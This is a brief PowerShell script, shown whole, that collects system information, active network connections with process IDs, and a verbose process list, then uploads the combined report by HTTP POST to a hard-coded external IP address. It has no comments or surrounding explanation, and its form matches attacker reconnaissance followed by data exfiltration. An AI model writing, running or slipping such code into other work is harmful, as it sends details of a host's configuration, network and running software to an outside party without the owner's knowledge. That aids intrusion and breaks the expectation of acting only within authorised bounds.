$report = @(
 systeminfo
 netstat -a -o
 tasklist /v
) | Out-String
(New-Object Net.WebClient).UploadString("https://93.184.216.34/report", $report)
